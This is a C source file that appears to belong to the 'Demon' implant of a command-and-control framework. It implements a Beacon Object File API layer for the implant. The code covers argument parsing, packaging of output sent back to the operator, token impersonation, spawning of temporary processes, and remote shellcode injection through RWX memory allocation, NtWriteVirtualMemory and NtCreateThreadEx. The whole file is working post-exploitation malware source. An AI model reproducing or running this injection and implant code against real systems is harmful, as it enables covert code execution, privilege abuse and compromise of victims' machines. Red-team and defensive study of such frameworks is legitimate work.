#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>

#include <Demon.h>

#include <Core/Command.h>
#include <Core/WinUtils.h>
#include <Core/MiniStd.h>
#include <Core/Package.h>
#include "Common/Defines.h"

#include <Loader/ObjectApi.h>

#define intAlloc( size )    Instance.Win32.LocalAlloc( LPTR, size )
#define intFree( addr )     Instance.Win32.LocalFree( addr )

#ifndef bufsize
#define bufsize 8192
#endif

// Meh some wrapper functions for internal demon GetProcAddress and GetModuleHandleA functions.
PVOID LdrModulePebString( PCHAR ModuleString )
{
    PRINTF( "ModuleString: %s : %lx\n", ModuleString, HashEx( ModuleString, 0, TRUE ) )
    return Instance.Win32.GetModuleHandleA( ModuleString );
}

PVOID LdrFunctionAddrString( PVOID Module, PCHAR Function )
{
    PRINTF( "Module:[%p] Function:[%s : %lx]\n", Module, Function, HashStringA( Function ) )
    return LdrFunctionAddr( Module, HashStringA( Function ) );
}

BOOL LdrFreeLibrary( HMODULE hLibModule )
{
    return Instance.Win32.FreeLibrary( hLibModule );
}

HLOCAL LdrLocalFree( PVOID hMem )
{
    return Instance.Win32.LocalFree( hMem );
}

COFFAPIFUNC BeaconApi[] = {
        { .NameHash = COFFAPI_BEACONDATAPARSER,             .Pointer = BeaconDataParse                  },
        { .NameHash = COFFAPI_BEACONDATAINT,                .Pointer = BeaconDataInt                    },
        { .NameHash = COFFAPI_BEACONDATASHORT,              .Pointer = BeaconDataShort                  },
        { .NameHash = COFFAPI_BEACONDATALENGTH,             .Pointer = BeaconDataLength                 },
        { .NameHash = COFFAPI_BEACONDATAEXTRACT,            .Pointer = BeaconDataExtract                },
        { .NameHash = COFFAPI_BEACONFORMATALLOC,            .Pointer = BeaconFormatAlloc                },
        { .NameHash = COFFAPI_BEACONFORMATRESET,            .Pointer = BeaconFormatReset                },
        { .NameHash = COFFAPI_BEACONFORMATFREE,             .Pointer = BeaconFormatFree                 },
        { .NameHash = COFFAPI_BEACONFORMATAPPEND,           .Pointer = BeaconFormatAppend               },
        { .NameHash = COFFAPI_BEACONFORMATPRINTF,           .Pointer = BeaconFormatPrintf               },
        { .NameHash = COFFAPI_BEACONFORMATTOSTRING,         .Pointer = BeaconFormatToString             },
        { .NameHash = COFFAPI_BEACONFORMATINT,              .Pointer = BeaconFormatInt                  },
        { .NameHash = COFFAPI_BEACONPRINTF,                 .Pointer = BeaconPrintf                     },
        { .NameHash = COFFAPI_BEACONOUTPUT,                 .Pointer = BeaconOutput                     },
        { .NameHash = COFFAPI_BEACONUSETOKEN,               .Pointer = BeaconUseToken                   },
        { .NameHash = COFFAPI_BEACONREVERTTOKEN,            .Pointer = BeaconRevertToken                },
        { .NameHash = COFFAPI_BEACONISADMIN,                .Pointer = BeaconIsAdmin                    },
        { .NameHash = COFFAPI_BEACONGETSPAWNTO,             .Pointer = BeaconGetSpawnTo                 },
        { .NameHash = COFFAPI_BEACONINJECTPROCESS,          .Pointer = BeaconInjectProcess              },
        { .NameHash = COFFAPI_BEACONSPAWNTEMPORARYPROCESS,  .Pointer = BeaconSpawnTemporaryProcess      },
        { .NameHash = COFFAPI_BEACONINJECTTEMPORARYPROCESS, .Pointer = BeaconInjectTemporaryProcess     },
        { .NameHash = COFFAPI_BEACONCLEANUPPROCESS,         .Pointer = BeaconCleanupProcess             },

        // End of array
        { .NameHash = 0, .Pointer = NULL },
};

COFFAPIFUNC LdrApi[] = {
        { .NameHash = COFFAPI_TOWIDECHAR,                   .Pointer = toWideChar                       },
        { .NameHash = COFFAPI_LOADLIBRARYA,                 .Pointer = LdrModuleLoad                    },
        { .NameHash = COFFAPI_GETMODULEHANDLE,              .Pointer = LdrModulePebString               },
        { .NameHash = COFFAPI_GETPROCADDRESS,               .Pointer = LdrFunctionAddrString            },
        { .NameHash = COFFAPI_FREELIBRARY,                  .Pointer = LdrFreeLibrary                   },
        { .NameHash = COFFAPI_LOCALFREE,                    .Pointer = LdrLocalFree                     },

        // End of array
        { .NameHash = 0, .Pointer = NULL },
};

uint32_t swap_endianess(uint32_t indata) {
    uint32_t testint = 0xaabbccdd;
    uint32_t outint = indata;
    if (((unsigned char*)&testint)[0] == 0xdd) {
        ((unsigned char*)&outint)[0] = ((unsigned char*)&indata)[3];
        ((unsigned char*)&outint)[1] = ((unsigned char*)&indata)[2];
        ((unsigned char*)&outint)[2] = ((unsigned char*)&indata)[1];
        ((unsigned char*)&outint)[3] = ((unsigned char*)&indata)[0];
    }
    return outint;
}

VOID BeaconDataParse( PDATA parser, PCHAR buffer, INT size )
{
    if ( parser == NULL )
        return;

    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size - 4;
    parser->size     = size - 4;
    parser->buffer   += 4;
}

INT BeaconDataInt( PDATA parser )
{
    UINT32 Value = 0;

    if ( parser->length < 4 )
        return 0;

    MemCopy( &Value, parser->buffer, 4 );

    parser->buffer += 4;
    parser->length -= 4;

    return ( INT ) Value;
}

SHORT BeaconDataShort( datap* parser )
{
    UINT16 Value = 0;

    if ( parser->length < 2 )
        return 0;

    MemCopy( &Value, parser->buffer, 2 );

    parser->buffer += 2;
    parser->length -= 2;

    return ( short ) Value;
}

INT BeaconDataLength( PDATA parser )
{
    return parser->length;
}

PCHAR BeaconDataExtract( PDATA parser, PINT size )
{
    INT   Length = 0;
    PVOID Data   = NULL;

    if ( parser->length < 4 )
        return NULL;

    MemCopy( &Length, parser->buffer, 4 );

    parser->buffer += 4;

    Data = parser->buffer;
    if ( Data == NULL )
        return NULL;

    parser->length -= 4;
    parser->length -= Length;
    parser->buffer += Length;

    if ( size != NULL )
        *size = Length;

    return Data;
}

VOID BeaconPrintf( INT Type, PCHAR fmt, ... )
{
    PRINTF( "BeaconPrintf( %d, %x, ... )\n", Type, fmt )

    PPACKAGE    package         = PackageCreate( BEACON_OUTPUT );
    va_list     VaListArg       = 0;
    PVOID       CallbackOutput  = NULL;
    INT         CallbackSize    = 0;

    va_start( VaListArg, fmt );

    CallbackSize    = Instance.Win32.vsnprintf( NULL, 0, fmt, VaListArg );
    CallbackOutput  = Instance.Win32.LocalAlloc( LPTR, CallbackSize );

    Instance.Win32.vsnprintf( CallbackOutput, CallbackSize, fmt, VaListArg );

    va_end( VaListArg );

    PRINTF( "CallbackOutput[%d]: \n%s\n", CallbackSize, CallbackOutput );

    PackageAddInt32( package, Type );
    PackageAddBytes( package, CallbackOutput, CallbackSize );
    PackageTransmit( package, NULL, NULL );

    MemSet( CallbackOutput, 0, CallbackSize );
    Instance.Win32.LocalFree( CallbackOutput );
}

VOID BeaconOutput( INT Type, PCHAR data, INT len )
{
    PRINTF( "BeaconOutput( %d, %p, %d )\n", Type, data, len )

    PPACKAGE Package = PackageCreate( BEACON_OUTPUT );

    PackageAddInt32( Package, Type );

    PackageAddBytes( Package, ( PBYTE ) data, len );

    PackageTransmit( Package, NULL, NULL );
}

BOOL BeaconIsAdmin()
{
    HANDLE          hToken    = NULL;
    TOKEN_ELEVATION Elevation = { 0 };
    DWORD           cbSize    = sizeof( TOKEN_ELEVATION );
    NTSTATUS        NtStatus  = STATUS_SUCCESS;

    if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &hToken ) ) )
    {
        if ( Instance.Win32.GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) )
        {
            Instance.Win32.NtClose( hToken );
            return ( BOOL ) Elevation.TokenIsElevated;
        }
        else PRINTF( "GetTokenInformation: Failed [%d]\n", NtGetLastError() );
    }
    else PRINTF( "NtOpenProcessToken: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) );

    if ( hToken )
        Instance.Win32.NtClose( hToken );

    return FALSE;
}

VOID BeaconFormatAlloc( PFORMAT format, int maxsz )
{
    if ( format == NULL )
        return;

    format->original = Instance.Win32.LocalAlloc(maxsz, 1);
    format->buffer = format->original;
    format->length = 0;
    format->size = maxsz;
}

VOID BeaconFormatReset( PFORMAT format )
{
    MemSet( format->original, 0, format->size );
    format->buffer = format->original;
    format->length = format->size;
}

VOID BeaconFormatFree( PFORMAT format )
{
    if ( format == NULL )
        return;

    if ( format->original )
    {
        Instance.Win32.LocalFree( format->original );
        format->original = NULL;
    }

    format->buffer = NULL;
    format->length = 0;
    format->size   = 0;
}

VOID BeaconFormatAppend( PFORMAT format, char* text, int len )
{
    MemCopy( format->buffer, text, len );
    format->buffer += len;
    format->length += len;
}

VOID BeaconFormatPrintf( PFORMAT format, char* fmt, ... )
{
    va_list args   = { 0 };
    int     length = 0;

    va_start( args, fmt );
    length = Instance.Win32.vsnprintf( NULL, 0, fmt, args );
    va_end( args );
    if ( format->length + length > format->size )
    {
        return;
    }

    va_start( args, fmt );
    Instance.Win32.vsnprintf( format->buffer, length, fmt, args );
    va_end( args );

    format->length += length;
    format->buffer += length;
}

char* BeaconFormatToString( PFORMAT format, int* size)
{
    *size = format->length;
    return format->original;
}

VOID BeaconFormatInt( PFORMAT format, int value)
{
    uint32_t indata = value;
    uint32_t outdata = 0;
    if (format->length + 4 > format->size) {
        return;
    }
    outdata = swap_endianess(indata);
    MemCopy(format->buffer, &outdata, 4);
    format->length += 4;
    format->buffer += 4;
    return;
}

BOOL BeaconUseToken( HANDLE token )
{
    HANDLE hImpersonateToken = INVALID_HANDLE_VALUE;

    if (!Instance.Syscall.NtDuplicateToken(token, 0, NULL, FALSE, TokenPrimary, &hImpersonateToken)) {
        return FALSE;
    }

    if (!Instance.Win32.SetThreadToken(NULL, hImpersonateToken)) {
        return FALSE;
    }

    return TRUE;
}

VOID BeaconRevertToken( VOID )
{
    Instance.Win32.RevertToSelf();
}

VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
{
    PWCHAR Path = NULL;
    SIZE_T Size = 0;

    if ( ! buffer )
        return;

    if ( x86 )
        Path = Instance.Config.Process.Spawn86;
    else
        Path = Instance.Config.Process.Spawn64;

    Size = StringLengthW( Path ) * sizeof( WCHAR );

    if ( Size > length )
        return;

    MemCopy( buffer, Path, Size );
}

BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo )
{
    BOOL    bSuccess    = FALSE;
    HANDLE  hToken      = INVALID_HANDLE_VALUE;
    PWCHAR  Path        = NULL;

    if (x86) {
        Path = Instance.Config.Process.Spawn86;
    } else {
        Path = Instance.Config.Process.Spawn64;
    }

    if (ignoreToken)
    {
        bSuccess = Instance.Win32.CreateProcessW(NULL, Path, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
    }
    else
    {
        bSuccess = Instance.Win32.CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, Path, CREATE_UNICODE_ENVIRONMENT, NULL, NULL, sInfo, pInfo);
    }

    return bSuccess;
}

VOID BeaconInjectProcess( HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char * arg, int a_len )
{
    PVOID             a_RemoteBuf      = NULL;
    PVOID             p_RemoteBuf      = NULL;
    SIZE_T            Size             = 0;
    NTSTATUS          Status           = STATUS_SUCCESS;
    CLIENT_ID         ClientID         = { 0 } ;
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };

    InitializeObjectAttributes( &ObjectAttributes, NULL, 0, NULL, NULL );

    if ( ! hProc )
    {
        ClientID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) pid;
        ClientID.UniqueThread  = ( HANDLE ) 0;
        Status = Instance.Syscall.NtOpenProcess( &hProc, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientID );
        if ( ! NT_SUCCESS( Status ) )
        {
            // BeaconInjectProcess does not seem to signal errors...
            return;
        }
    }

    // allocate memory space for payload
    Size = p_len * sizeof( CHAR );
    Status = Instance.Syscall.NtAllocateVirtualMemory(hProc, &p_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if ( ! NT_SUCCESS( Status ) )
        return;

    Status = Instance.Syscall.NtWriteVirtualMemory(hProc, p_RemoteBuf, (PVOID)payload, Size, 0);
    if ( ! NT_SUCCESS( Status ) )
        return;

    // allocate memory space for argument
    Size = a_len * sizeof( CHAR );
    Status = Instance.Syscall.NtAllocateVirtualMemory(hProc, &a_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if ( ! NT_SUCCESS( Status ) )
        return;

    Status = Instance.Syscall.NtWriteVirtualMemory(hProc, a_RemoteBuf, (PVOID)arg, Size, 0);
    if ( ! NT_SUCCESS( Status ) )
        return;

    Status = Instance.Syscall.NtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, hProc, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
    if ( ! NT_SUCCESS( Status ) )
        return;
}

VOID BeaconInjectTemporaryProcess( PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len )
{
    PVOID p_RemoteBuf;
    PVOID a_RemoteBuf;
    SIZE_T Size;
    NTSTATUS Status;

    // allocate memory space for payload
    Size = p_len * sizeof(char);
    Status = Instance.Syscall.NtAllocateVirtualMemory(pInfo->hProcess, &p_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (Status != STATUS_SUCCESS) {
        return;
    }

    Status = Instance.Syscall.NtWriteVirtualMemory(pInfo->hProcess, p_RemoteBuf, (PVOID)payload, Size, 0);
    if (Status != STATUS_SUCCESS) {
        return;
    }

    // allocate memory space for argument
    Size = a_len * sizeof(char);
    Status = Instance.Syscall.NtAllocateVirtualMemory(pInfo->hProcess, &a_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (Status != STATUS_SUCCESS) {
        return;
    }

    Status = Instance.Syscall.NtWriteVirtualMemory(pInfo->hProcess, a_RemoteBuf, (PVOID)arg, Size, 0);
    if (Status != STATUS_SUCCESS) {
        return;
    }

    Instance.Syscall.NtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, pInfo->hProcess, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
}

VOID BeaconCleanupProcess( PROCESS_INFORMATION* pInfo )
{
    NTSTATUS status;

    status = Instance.Win32.NtClose(pInfo->hProcess);
    if (status != STATUS_SUCCESS)
        return;

    status = Instance.Win32.NtClose(pInfo->hThread);
    if (status != STATUS_SUCCESS)
        return;
}

BOOL toWideChar( char* src, wchar_t* dst, int max )
{
    SIZE_T Length = 0;

    Length = CharStringToWCharString(dst, src, max);
    if (Length == 0) {
        return FALSE;
    }

    return TRUE;
}
